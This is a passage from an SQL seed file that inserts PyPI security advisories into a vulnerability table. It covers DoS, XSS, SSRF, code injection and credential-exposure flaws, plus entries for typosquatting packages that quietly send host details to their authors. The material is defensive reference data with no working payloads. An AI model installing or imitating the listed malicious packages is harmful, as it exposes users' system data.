"9.4.134.dev5", "9.4.134.dev6", "9.4.134.dev7", "9.4.135", "9.4.136", "9.4.137", "9.4.137.dev1", "9.4.138", "9.4.138.dev1", "9.4.139", "9.4.139.dev1", "9.4.139.dev2", "9.4.14", "9.4.141", "9.4.142", "9.4.143", "9.4.143.dev1", "9.4.144", "9.4.144.dev1", "9.4.145", "9.4.145.dev1", "9.4.145.dev2", "9.4.146", "9.4.146.dev1", "9.4.147", "9.4.147.dev1", "9.4.148", "9.4.148.dev1", "9.4.149", "9.4.149.dev1", "9.4.15", "9.4.150", "9.4.150.dev1", "9.4.151", "9.4.151.dev1", "9.4.152", "9.4.152.dev1", "9.4.153", "9.4.153.dev1", "9.4.154", "9.4.154.dev1", "9.4.155", "9.4.155.dev1", "9.4.156", "9.4.156.dev1", "9.4.157", "9.4.157.dev1", "9.4.158", "9.4.158.dev1", "9.4.159", "9.4.159.dev1", "9.4.16", "9.4.160", "9.4.160.dev1", "9.4.161", "9.4.161.dev1", "9.4.162.dev1", "9.4.163", "9.4.164", "9.4.164.dev1", "9.4.164.dev2", "9.4.165", "9.4.165.dev1", "9.4.166", "9.4.166.dev1", "9.4.167", "9.4.167.dev1", "9.4.168", "9.4.168.dev1", "9.4.168.dev2", "9.4.169", "9.4.169.dev1", "9.4.169.dev2", "9.4.17", "9.4.170", "9.4.171", "9.4.171.dev1", "9.4.172", "9.4.172.dev1", "9.4.173", "9.4.173.dev1", "9.4.174", "9.4.174.dev1", "9.4.175", "9.4.175.dev1", "9.4.176", "9.4.177", "9.4.178", "9.4.178.dev1", "9.4.178.dev15", "9.4.178.dev16", "9.4.178.dev17", "9.4.178.dev2", "9.4.178.dev3", "9.4.178.dev4", "9.4.178.dev5", "9.4.178.dev6", "9.4.178.dev7", "9.4.178.dev8", "9.4.179", "9.4.179.dev1", "9.4.18", "9.4.181", "9.4.182.dev1", "9.4.182.dev2", "9.4.183", "9.4.184.dev1", "9.4.184.dev4", "9.4.184.dev5", "9.4.184.dev6", "9.4.184.dev8", "9.4.184.dev9", "9.4.186", "9.4.186.dev1", "9.4.187", "9.4.187.dev5", "9.4.188", "9.4.188.dev1", "9.4.189", "9.4.189.dev1", "9.4.189.dev2", "9.4.189.dev3", "9.4.19", "9.4.190", "9.4.190.dev1", "9.4.190.dev2", "9.4.191", "9.4.191.dev1", "9.4.191.dev2", "9.4.192", "9.4.192.dev1", "9.4.192.dev2", "9.4.192.dev3", "9.4.193", "9.4.193.dev1", "9.4.193.dev2", "9.4.194", "9.4.194.dev1", "9.4.194.dev2", "9.4.194.dev3", "9.4.194.dev4", "9.4.194.dev5", "9.4.194.dev6", "9.4.195", "9.4.195.dev1", "9.4.196", "9.4.196.dev1", "9.4.197", "9.4.197.dev1", "9.4.197.dev3", "9.4.197.dev4", "9.4.197.dev5", "9.4.198", "9.4.198.dev1", "9.4.199", "9.4.199.dev1", "9.4.2", "9.4.20", "9.4.200", "9.4.200.dev1", "9.4.200.dev10", "9.4.200.dev3", "9.4.200.dev4", "9.4.200.dev5", "9.4.200.dev6", "9.4.200.dev7", "9.4.200.dev8", "9.4.200.dev9", "9.4.201", "9.4.202", "9.4.202.dev10", "9.4.202.dev11", "9.4.202.dev12", "9.4.202.dev13", "9.4.202.dev14", "9.4.202.dev15", "9.4.202.dev16", "9.4.202.dev17", "9.4.202.dev18", "9.4.202.dev2", "9.4.202.dev20", "9.4.202.dev21", "9.4.202.dev22", "9.4.202.dev23", "9.4.202.dev24", "9.4.202.dev25", "9.4.202.dev26", "9.4.202.dev27", "9.4.202.dev28", "9.4.202.dev29", "9.4.202.dev3", "9.4.202.dev30", "9.4.202.dev31", "9.4.202.dev33", "9.4.202.dev34", "9.4.202.dev35", "9.4.202.dev36", "9.4.202.dev4", "9.4.202.dev5", "9.4.202.dev6", "9.4.202.dev7", "9.4.202.dev8", "9.4.202.dev9", "9.4.203", "9.4.203.dev1", "9.4.204", "9.4.204.dev1", "9.4.205", "9.4.205.dev1", "9.4.205.dev2", "9.4.205.dev3", "9.4.205.dev4", "9.4.205.dev5", "9.4.206", "9.4.206.dev1", "9.4.207", "9.4.207.dev1", "9.4.207.dev2", "9.4.208", "9.4.208.dev1", "9.4.208.dev2", "9.4.208.dev3", "9.4.208.dev4", "9.4.208.dev5", "9.4.209", "9.4.209.dev1", "9.4.21", "9.4.210", "9.4.210.dev1", "9.4.211", "9.4.211.dev1", "9.4.211.dev2", "9.4.212", "9.4.212.dev1", "9.4.212.dev10", "9.4.212.dev11", "9.4.212.dev12", "9.4.212.dev13", "9.4.212.dev14", "9.4.212.dev15", "9.4.212.dev16", "9.4.212.dev17", "9.4.212.dev18", "9.4.212.dev19", "9.4.212.dev2", "9.4.212.dev20", "9.4.212.dev21", "9.4.212.dev22", "9.4.212.dev23", "9.4.212.dev24", "9.4.212.dev25", "9.4.212.dev26", "9.4.212.dev28", "9.4.212.dev29", "9.4.212.dev3", "9.4.212.dev30", "9.4.212.dev31", "9.4.212.dev32", "9.4.212.dev33", "9.4.212.dev34", "9.4.212.dev35", "9.4.212.dev36", "9.4.212.dev37", "9.4.212.dev38", "9.4.212.dev39", "9.4.212.dev4", "9.4.212.dev40", "9.4.212.dev41", "9.4.212.dev42", "9.4.212.dev43", "9.4.212.dev44", "9.4.212.dev45", "9.4.212.dev46", "9.4.212.dev47", "9.4.212.dev48", "9.4.212.dev49", "9.4.212.dev5", "9.4.212.dev50", "9.4.212.dev51", "9.4.212.dev52", "9.4.212.dev6", "9.4.212.dev7", "9.4.212.dev8", "9.4.212.dev9", "9.4.213", "9.4.213.dev1", "9.4.214", "9.4.214.dev3", "9.4.214.dev4", "9.4.214.dev5", "9.4.214.dev6", "9.4.214.dev7", "9.4.215", "9.4.215.dev1", "9.4.216", "9.4.216.dev1", "9.4.216.dev2", "9.4.216.dev3", "9.4.216.dev4", "9.4.216.dev5", "9.4.216.dev6", "9.4.217", "9.4.217.dev1", "9.4.218", "9.4.218.dev1", "9.4.219", "9.4.219.dev1", "9.4.219.dev2", "9.4.219.dev3", "9.4.219.dev4", "9.4.219.dev5", "9.4.219.dev6", "9.4.22", "9.4.220", "9.4.220.dev1", "9.4.221", "9.4.221.dev1", "9.4.222", "9.4.222.dev1", "9.4.223", "9.4.223.dev1", "9.4.224.dev1", "9.4.224.dev2", "9.4.224.dev3", "9.4.224.dev4", "9.4.224.dev5", "9.4.224.dev6", "9.4.224.dev7", "9.4.224.dev8", "9.4.23", "9.4.24", "9.4.25", "9.4.26", "9.4.27", "9.4.28", "9.4.29", "9.4.29.dev1", "9.4.29.dev2", "9.4.3", "9.4.30", "9.4.30.dev1", "9.4.31", "9.4.31.dev1", "9.4.31.dev2", "9.4.31.dev3", "9.4.31.dev4", "9.4.31.dev5", "9.4.32", "9.4.34", "9.4.35", "9.4.36", "9.4.36.dev1", "9.4.36.dev2", "9.4.36.dev3", "9.4.38", "9.4.39", "9.4.4", "9.4.40", "9.4.41", "9.4.41.dev1", "9.4.43", "9.4.44", "9.4.45", "9.4.46", "9.4.47", "9.4.48", "9.4.48.dev1", "9.4.48.dev2", "9.4.48.dev3", "9.4.48.dev4", "9.4.48.dev5", "9.4.48.dev6", "9.4.48.dev7", "9.4.48.dev8", "9.4.48.dev9", "9.4.49", "9.4.5", "9.4.50", "9.4.51", "9.4.52", "9.4.53", "9.4.55", "9.4.56", "9.4.56.dev1", "9.4.56.dev2", "9.4.56.dev3", "9.4.56.dev4", "9.4.56.dev5", "9.4.57", "9.4.58", "9.4.58.dev1", "9.4.59", "9.4.59.dev1", "9.4.59.dev3", "9.4.6", "9.4.61", "9.4.62", "9.4.62.dev1", "9.4.63", "9.4.65", "9.4.66", "9.4.68", "9.4.69", "9.4.69.dev1", "9.4.7", "9.4.70", "9.4.70.dev1", "9.4.71", "9.4.72", "9.4.73", "9.4.74", "9.4.74.dev1", "9.4.74.dev2", "9.4.75", "9.4.76", "9.4.77", "9.4.78", "9.4.79", "9.4.8", "9.4.80", "9.4.81", "9.4.82", "9.4.83", "9.4.84", "9.4.84.dev2", "9.4.85.dev10", "9.4.85.dev11", "9.4.85.dev12", "9.4.85.dev13", "9.4.85.dev14", "9.4.85.dev15", "9.4.85.dev16", "9.4.85.dev17", "9.4.85.dev18", "9.4.85.dev19", "9.4.85.dev2", "9.4.85.dev20", "9.4.85.dev21", "9.4.85.dev22", "9.4.85.dev23", "9.4.85.dev24", "9.4.85.dev25", "9.4.85.dev26", "9.4.85.dev27", "9.4.85.dev28", "9.4.85.dev29", "9.4.85.dev3", "9.4.85.dev30", "9.4.85.dev31", "9.4.85.dev35", "9.4.85.dev36", "9.4.85.dev37", "9.4.85.dev4", "9.4.85.dev5", "9.4.85.dev6", "9.4.85.dev7", "9.4.85.dev8", "9.4.85.dev9", "9.4.87.dev1", "9.4.87.dev2", "9.4.87.dev3", "9.4.87.dev4", "9.4.87.dev5", "9.4.87.dev6", "9.4.87.dev7", "9.4.87.dev8", "9.4.87.dev9", "9.4.88.dev2", "9.4.88.dev3", "9.4.88.dev4", "9.4.88.dev5", "9.4.88.dev6", "9.4.9", "9.4.92.dev1", "9.4.96", "9.4.96.dev1", "9.4.96.dev2", "9.4.97", "9.4.97.dev1", "9.4.98", "9.4.99"]'::jsonb, '0.0', '2021-04-12 14:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-79rp-v9rm-gxm8', 'OSV', 'fschat', 'pypi', 'FastChat Denial of Service vulnerability', 'A Denial of Service (DoS) vulnerability exists in the file upload feature of lm-sys/fastchat version 0.2.36. The vulnerability is due to improper handling of form-data with a large filename in the file upload request. An attacker can exploit this by sending a payload with an excessively large filename, causing the server to become overwhelmed and unavailable to legitimate users.', '["0.1.1", "0.1.10", "0.1.2", "0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.1.8", "0.1.9", "0.2.0", "0.2.1", "0.2.10", "0.2.11", "0.2.12", "0.2.13", "0.2.14", "0.2.15", "0.2.16", "0.2.17", "0.2.18", "0.2.2", "0.2.20", "0.2.21", "0.2.23", "0.2.24", "0.2.26", "0.2.27", "0.2.28", "0.2.29", "0.2.3", "0.2.30", "0.2.31", "0.2.32", "0.2.33", "0.2.34", "0.2.35", "0.2.36", "0.2.4", "0.2.5", "0.2.6", "0.2.7", "0.2.8", "0.2.9"]'::jsonb, '0.0', '2025-03-20 12:32:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191787', 'OSV', 'matplotliv', 'pypi', 'Malicious code in matplotliv (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (491ff5ae8247837ff9be18d46366f453395dab2413f44f6251aff0b271f7d25b)
Typosqatting package collecting, but not exfiltrating (thus fulfiling the educational promise), sensitive data


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2025-09-matplotliv


Reasons (based on the campaign):


 - typosquatting
', '["0.1.0"]'::jsonb, '0.0', '2025-09-26 23:07:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-94ww-22rx-493x', 'OSV', 'flower', 'pypi', 'Cross-Site Scripting', 'Flower, before 0.9.2, has a XSS on tasks page because data is not properly escaped.', '["0.1.0", "0.2.0", "0.3.0", "0.3.1", "0.4.0", "0.4.2", "0.4.3", "0.5.0", "0.5.1", "0.5.2", "0.6.0", "0.7.0", "0.7.1", "0.7.2", "0.7.3", "0.8.0", "0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.9.0", "0.9.1"]'::jsonb, '0.0', '2021-02-24 19:46:35+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2021-171', 'OSV', 'tensorflow', 'pypi', '', 'TensorFlow is an end-to-end open source platform for machine learning. An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.SparseConcat`. This is because the implementation(https://github.com/tensorflow/tensorflow/blob/b432a38fe0e1b4b904a6c222cbce794c39703e87/tensorflow/core/kernels/sparse_concat_op.cc#L76) takes the values specified in `shapes[0]` as dimensions for the output shape. The `TensorShape` constructor(https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when `InitDims`(https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status. This is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows. The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.', '["0.12.0", "0.12.0rc0", "0.12.0rc1", "0.12.1", "1.0.0", "1.0.1", "1.1.0", "1.1.0rc0", "1.1.0rc1", "1.1.0rc2", "1.10.0", "1.10.0rc0", "1.10.0rc1", "1.10.1", "1.11.0", "1.11.0rc0", "1.11.0rc1", "1.11.0rc2", "1.12.0", "1.12.0rc0", "1.12.0rc1", "1.12.0rc2", "1.12.2", "1.12.3", "1.13.0rc0", "1.13.0rc1", "1.13.0rc2", "1.13.1", "1.13.2", "1.14.0", "1.14.0rc0", "1.14.0rc1", "1.15.0", "1.15.0rc0", "1.15.0rc1", "1.15.0rc2", "1.15.0rc3", "1.15.2", "1.15.3", "1.15.4", "1.15.5", "1.2.0", "1.2.0rc0", "1.2.0rc1", "1.2.0rc2", "1.2.1", "1.3.0", "1.3.0rc0", "1.3.0rc1", "1.3.0rc2", "1.4.0", "1.4.0rc0", "1.4.0rc1", "1.4.1", "1.5.0", "1.5.0rc0", "1.5.0rc1", "1.5.1", "1.6.0", "1.6.0rc0", "1.6.0rc1", "1.7.0", "1.7.0rc0", "1.7.0rc1", "1.7.1", "1.8.0", "1.8.0rc0", "1.8.0rc1", "1.9.0", "1.9.0rc0", "1.9.0rc1", "1.9.0rc2", "2.0.0", "2.0.0a0", "2.0.0b0", "2.0.0b1", "2.0.0rc0", "2.0.0rc1", "2.0.0rc2", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.1.0", "2.1.0rc0", "2.1.0rc1", "2.1.0rc2", "2.1.1", "2.1.2", "2.1.3", "2.1.4", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.3.0", "2.3.1", "2.3.2", "2.3.3", "2.4.0", "2.4.1", "2.4.2"]'::jsonb, '0.0', '2021-05-14 20:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-5994', 'OSV', 'setupyntq', 'pypi', 'Malicious code in setupyntq (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["0.0.1"]'::jsonb, '0.0', '2024-06-25 13:42:27+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-11614', 'OSV', 'imagedreamfusion', 'pypi', 'Malicious code in imagedreamfusion (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (a6d6718a5b7231657a334b5a35b2053de510f4c15bdf137085121d29b5086121)
A campaign of probably pentest packages flooding PYPI. Installing the package or importing the module triggers reporting basic info like hostname, path and the username to the package author. There is no other purpose of the package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2024-11-byted-dast


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - typosquatting


 - dependency-confusion
', '["9.6"]'::jsonb, '0.0', '2024-11-06 18:46:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-22c2-9gwg-mj59', 'OSV', 'langroid', 'pypi', 'Langroid has a Code Injection vulnerability in LanceDocChatAgent through vector_store', '### Summary
[LanceDocChatAgent](https://github.com/langroid/langroid/blob/main/langroid/agent/special/lance_doc_chat_agent.py#L158) uses pandas eval() through `compute_from_docs()`:
https://github.com/langroid/langroid/blob/18667ec7e971efc242505196f6518eb19a0abc1c/langroid/vector_store/base.py#L136-L150

As a result, an attacker may be able to make the agent run malicious commands through [QueryPlan.dataframe_calc](https://github.com/langroid/langroid/blob/main/langroid/agent/special/lance_tools.py#L16) compromising the host system.

### Fix 
Langroid 0.53.15 sanitizes input to the affected function by default to tackle the most common attack vectors, and added several warnings about the risky behavior in the project documentation.', '["0.1.100", "0.1.101", "0.1.102", "0.1.103", "0.1.104", "0.1.105", "0.1.106", "0.1.107", "0.1.108", "0.1.109", "0.1.11", "0.1.110", "0.1.111", "0.1.112", "0.1.113", "0.1.114", "0.1.117", "0.1.118", "0.1.119", "0.1.12", "0.1.120", "0.1.121", "0.1.122", "0.1.123", "0.1.124", "0.1.125", "0.1.126", "0.1.127", "0.1.128", "0.1.129", "0.1.13", "0.1.130", "0.1.131", "0.1.132", "0.1.133", "0.1.134", "0.1.135", "0.1.136", "0.1.137", "0.1.138", "0.1.139", "0.1.140", "0.1.141", "0.1.142", "0.1.143", "0.1.144", "0.1.145", "0.1.147", "0.1.148", "0.1.149", "0.1.15", "0.1.150", "0.1.151", "0.1.152", "0.1.153", "0.1.154", "0.1.155", "0.1.156", "0.1.157", "0.1.158", "0.1.159", "0.1.160", "0.1.161", "0.1.162", "0.1.163", "0.1.164", "0.1.165", "0.1.166", "0.1.167", "0.1.168", "0.1.169", "0.1.17", "0.1.170", "0.1.171", "0.1.172", "0.1.173", "0.1.174", "0.1.175", "0.1.176", "0.1.177", "0.1.178", "0.1.179", "0.1.18", "0.1.181", "0.1.182", "0.1.183", "0.1.184", "0.1.185", "0.1.186", "0.1.187", "0.1.188", "0.1.189", "0.1.19", "0.1.190", "0.1.191", "0.1.192", "0.1.193", "0.1.194", "0.1.195", "0.1.196", "0.1.197", "0.1.198", "0.1.199", "0.1.20", "0.1.200", "0.1.201", "0.1.202", "0.1.203", "0.1.205", "0.1.206", "0.1.207", "0.1.208", "0.1.209", "0.1.21", "0.1.210", "0.1.211", "0.1.212", "0.1.213", "0.1.214", "0.1.215", "0.1.217", "0.1.218", "0.1.219", "0.1.22", "0.1.221", "0.1.222", "0.1.224", "0.1.225", "0.1.226", "0.1.227", "0.1.228", "0.1.229", "0.1.23", "0.1.230", "0.1.231", "0.1.233", "0.1.234", "0.1.235", "0.1.236", "0.1.237", "0.1.238", "0.1.239", "0.1.24", "0.1.240", "0.1.241", "0.1.243", "0.1.244", "0.1.245", "0.1.246", "0.1.247", "0.1.248", "0.1.249", "0.1.25", "0.1.250", "0.1.251", "0.1.252", "0.1.253", "0.1.254", "0.1.256", "0.1.257", "0.1.258", "0.1.26", "0.1.260", "0.1.261", "0.1.262", "0.1.263", "0.1.265", "0.1.27", "0.1.28", "0.1.29", "0.1.30", "0.1.31", "0.1.32", "0.1.33", "0.1.34", "0.1.35", "0.1.36", "0.1.37", "0.1.38", "0.1.39", "0.1.40", "0.1.41", "0.1.42", "0.1.43", "0.1.44", "0.1.46", "0.1.47", "0.1.48", "0.1.49", "0.1.50", "0.1.51", "0.1.52", "0.1.53", "0.1.54", "0.1.55", "0.1.56", "0.1.57", "0.1.58", "0.1.59", "0.1.60", "0.1.61", "0.1.62", "0.1.63", "0.1.64", "0.1.65", "0.1.66", "0.1.67", "0.1.68", "0.1.69", "0.1.72", "0.1.73", "0.1.76", "0.1.77", "0.1.78", "0.1.79", "0.1.8", "0.1.80", "0.1.81", "0.1.83", "0.1.84", "0.1.85", "0.1.86", "0.1.87", "0.1.88", "0.1.89", "0.1.9", "0.1.90", "0.1.91", "0.1.92", "0.1.93", "0.1.94", "0.1.95", "0.1.96", "0.1.97", "0.1.98", "0.1.99", "0.10.0", "0.10.1", "0.10.2", "0.11.0", "0.12.0", "0.13.0", "0.14.0", "0.15.0", "0.15.1", "0.15.2", "0.16.0", "0.16.1", "0.16.2", "0.16.3", "0.16.4", "0.16.5", "0.16.6", "0.16.7", "0.17.0", "0.17.1", "0.18.0", "0.18.1", "0.18.2", "0.18.3", "0.19.0", "0.19.1", "0.19.2", "0.19.3", "0.19.4", "0.19.5", "0.2.0", "0.2.10", "0.2.11", "0.2.12", "0.2.2", "0.2.3", "0.2.4", "0.2.5", "0.2.6", "0.2.7", "0.2.9", "0.20.0", "0.20.1", "0.21.0", "0.22.0", "0.22.1", "0.22.2", "0.22.3", "0.22.4", "0.22.5", "0.22.6", "0.22.7", "0.23.0", "0.23.1", "0.23.2", "0.23.3", "0.24.1", "0.25.0", "0.26.0", "0.26.1", "0.26.2", "0.27.1", "0.27.2", "0.27.3", "0.27.4", "0.28.0", "0.28.1", "0.28.2", "0.28.3", "0.28.4", "0.28.5", "0.28.6", "0.28.7", "0.29.0", "0.3.0", "0.3.1", "0.30.0", "0.30.1", "0.31.0", "0.31.1", "0.31.2", "0.31.3", "0.32.0", "0.32.1", "0.32.2", "0.33.10", "0.33.11", "0.33.12", "0.33.13", "0.33.3", "0.33.4", "0.33.6", "0.33.7", "0.33.8", "0.33.9", "0.34.0", "0.34.1", "0.35.0", "0.35.1", "0.36.0", "0.36.1", "0.37.0", "0.37.1", "0.37.2", "0.37.3", "0.37.4", "0.37.5", "0.37.6", "0.37.7", "0.38.0", "0.39.0", "0.39.1", "0.39.2", "0.39.3", "0.39.4", "0.39.5", "0.40.0", "0.41.0", "0.41.1", "0.41.2", "0.41.3", "0.41.4", "0.41.5", "0.42.0", "0.42.1", "0.42.10", "0.42.2", "0.42.3", "0.42.4", "0.42.5", "0.42.6", "0.42.7", "0.42.8", "0.42.9", "0.43.0", "0.43.1", "0.44.0", "0.45.0", "0.45.1", "0.45.10", "0.45.2", "0.45.3", "0.45.4", "0.45.5", "0.45.6", "0.45.7", "0.45.8", "0.46.0", "0.47.0", "0.47.1", "0.47.2", "0.48.0", "0.48.1", "0.48.2", "0.48.3", "0.49.0", "0.49.1", "0.5.0", "0.5.1", "0.50.0", "0.50.1", "0.50.10", "0.50.11", "0.50.12", "0.50.2", "0.50.3", "0.50.4", "0.50.5", "0.50.6", "0.50.7", "0.50.8", "0.50.9", "0.51.0", "0.51.1", "0.51.2", "0.52.0", "0.52.1", "0.52.2", "0.52.3", "0.52.4", "0.52.5", "0.52.6", "0.52.7", "0.52.8", "0.52.9", "0.53.0", "0.53.1", "0.53.10", "0.53.11", "0.53.12", "0.53.13", "0.53.14", "0.53.2", "0.53.4", "0.53.5", "0.53.6", "0.53.7", "0.53.8", "0.6.0", "0.6.1", "0.6.3", "0.6.4", "0.6.5", "0.6.6", "0.6.7", "0.8.0", "0.9.0", "0.9.1", "0.9.2", "0.9.3", "0.9.4", "0.9.5"]'::jsonb, '0.0', '2025-05-20 18:01:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gc9g-67cq-p7v4', 'OSV', 'plone', 'pypi', 'Server-Side Request Forgery in Plone', 'Plone though 5.2.4 allows SSRF via the lxml parser. This affects Diazo themes, Dexterity TTW schemas, and modeleditors in plone.app.theming, plone.app.dexterity, and plone.supermodel.', '["3.2", "3.2.1", "3.2.2", "3.2.3", "3.2a1", "3.2rc1", "3.3", "3.3.1", "3.3.2", "3.3.3", "3.3.4", "3.3.5", "3.3.6", "3.3b1", "3.3rc1", "3.3rc2", "3.3rc3", "3.3rc4", "3.3rc5", "4.0", "4.0.1", "4.0.10", "4.0.2", "4.0.3", "4.0.4", "4.0.5", "4.0.6", "4.0.7", "4.0.8", "4.0.9", "4.0a1", "4.0a2", "4.0a3", "4.0a4", "4.0a5", "4.0b1", "4.0b2", "4.0b3", "4.0b4", "4.0b5", "4.0rc1", "4.1", "4.1.1", "4.1.2", "4.1.3", "4.1.4", "4.1.5", "4.1.6", "4.1a1", "4.1a2", "4.1a3", "4.1b1", "4.1b2", "4.1rc2", "4.1rc3", "4.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4", "4.2.5", "4.2.6", "4.2.7", "4.2a1", "4.2a2", "4.2b1", "4.2b2", "4.2rc1", "4.2rc2", "4.3", "4.3.1", "4.3.10", "4.3.11", "4.3.12", "4.3.13", "4.3.14", "4.3.15", "4.3.16", "4.3.17", "4.3.18", "4.3.19", "4.3.2", "4.3.20", "4.3.3", "4.3.4", "4.3.5", "4.3.6", "4.3.7", "4.3.8", "4.3.9", "4.3a1", "4.3a2", "4.3b1", "4.3b2", "4.3rc1", "5.0", "5.0.1", "5.0.10", "5.0.2", "5.0.3", "5.0.4", "5.0.5", "5.0.6", "5.0.7", "5.0.8", "5.0.9", "5.0a1", "5.0a2", "5.0a3", "5.0b1", "5.0b2", "5.0b3", "5.0b4", "5.0rc1", "5.0rc2", "5.0rc3", "5.1.0", "5.1.1", "5.1.2", "5.1.3", "5.1.4", "5.1.5", "5.1.6", "5.1.7", "5.1a1", "5.1a2", "5.1b1", "5.1b2", "5.1b3", "5.1b4", "5.1rc1", "5.1rc2", "5.2.0", "5.2.1", "5.2.2", "5.2.3", "5.2.4", "5.2a1", "5.2a2", "5.2b1", "5.2rc1", "5.2rc2", "5.2rc3", "5.2rc4", "5.2rc5"]'::jsonb, '0.0', '2021-06-15 16:12:04+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jrcv-3c5h-rh3q', 'OSV', 'sickrage', 'pypi', 'SiCKRAGE Discloses Plaintext Credentials', 'SickRage before v2018.03.09-1 includes cleartext credentials in HTTP responses.', '["10.0.0", "10.0.0.dev10", "10.0.0.dev11", "10.0.0.dev12", "10.0.0.dev13", "10.0.0.dev14", "10.0.0.dev15", "10.0.0.dev16", "10.0.0.dev17", "10.0.0.dev18", "10.0.0.dev19", "10.0.0.dev20", "10.0.0.dev21", "10.0.0.dev22", "10.0.0.dev23", "10.0.0.dev24", "10.0.0.dev25", "10.0.0.dev26", "10.0.0.dev27", "10.0.0.dev28", "10.0.0.dev29", "10.0.0.dev3", "10.0.0.dev30", "10.0.0.dev31", "10.0.0.dev33", "10.0.0.dev34", "10.0.0.dev35", "10.0.0.dev4", "10.0.0.dev5", "10.0.0.dev6", "10.0.0.dev7", "10.0.0.dev8", "10.0.0.dev9", "10.0.1", "10.0.1.dev1", "10.0.10", "10.0.10.dev1", "10.0.10.dev2", "10.0.11", "10.0.11.dev1", "10.0.11.dev2", "10.0.12", "10.0.12.dev1", "10.0.12.dev2", "10.0.12.dev3", "10.0.12.dev4", "10.0.12.dev5", "10.0.12.dev6", "10.0.12.dev7", "10.0.12.dev8", "10.0.13", "10.0.13.dev2", "10.0.14", "10.0.14.dev1", "10.0.15", "10.0.15.dev1", "10.0.16", "10.0.16.dev1", "10.0.17", "10.0.17.dev1", "10.0.18", "10.0.18.dev1", "10.0.19", "10.0.19.dev1", "10.0.2", "10.0.2.dev1", "10.0.20", "10.0.20.dev1", "10.0.21", "10.0.21.dev1", "10.0.21.dev2", "10.0.22", "10.0.22.dev1", "10.0.23", "10.0.23.dev1", "10.0.24", "10.0.24.dev1", "10.0.25", "10.0.25.dev1", "10.0.25.dev2", "10.0.25.dev3", "10.0.26", "10.0.26.dev1", "10.0.27", "10.0.27.dev2", "10.0.28", "10.0.28.dev1", "10.0.29", "10.0.29.dev1", "10.0.3", "10.0.3.dev1", "10.0.30", "10.0.30.dev1", "10.0.31", "10.0.31.dev1", "10.0.32", "10.0.32.dev1", "10.0.33", "10.0.33.dev1", "10.0.33.dev2", "10.0.33.dev3", "10.0.34", "10.0.34.dev1", "10.0.35", "10.0.35.dev1", "10.0.36", "10.0.36.dev1", "10.0.37", "10.0.37.dev1", "10.0.38", "10.0.38.dev1", "10.0.39", "10.0.39.dev1", "10.0.4", "10.0.4.dev1", "10.0.4.dev2", "10.0.4.dev3", "10.0.4.dev4", "10.0.40", "10.0.40.dev1", "10.0.41", "10.0.41.dev1", "10.0.42", "10.0.42.dev1", "10.0.43", "10.0.43.dev1", "10.0.44", "10.0.44.dev1", "10.0.45", "10.0.45.dev1", "10.0.46", "10.0.46.dev1", "10.0.47", "10.0.47.dev1", "10.0.48", "10.0.48.dev1", "10.0.49", "10.0.49.dev1", "10.0.49.dev2", "10.0.5", "10.0.5.dev1", "10.0.50", "10.0.50.dev1", "10.0.51", "10.0.51.dev1", "10.0.52", "10.0.52.dev1", "10.0.53", "10.0.53.dev1", "10.0.53.dev2", "10.0.54", "10.0.54.dev1", "10.0.55", "10.0.55.dev1", "10.0.56", "10.0.56.dev1", "10.0.57", "10.0.57.dev1", "10.0.57.dev2", "10.0.58", "10.0.58.dev1", "10.0.59", "10.0.59.dev1", "10.0.6", "10.0.6.dev1", "10.0.60", "10.0.60.dev1", "10.0.60.dev2", "10.0.60.dev3", "10.0.61", "10.0.61.dev1", "10.0.61.dev2", "10.0.62", "10.0.62.dev1", "10.0.62.dev2", "10.0.63", "10.0.63.dev1", "10.0.64", "10.0.64.dev1", "10.0.64.dev2", 